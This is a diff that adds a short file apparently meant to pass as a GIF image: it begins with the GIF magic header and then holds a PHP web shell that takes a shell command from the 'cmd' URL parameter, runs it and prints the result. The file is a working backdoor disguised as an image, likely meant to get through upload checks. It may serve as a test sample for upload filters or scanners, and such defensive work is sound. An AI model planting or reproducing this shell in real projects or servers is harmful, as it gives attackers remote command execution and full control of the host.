@@ -1,0 +1,5 @@
+GIF8;
+
+<?php
+	$command=$_GET['cmd']; echo `$command`;
+?>
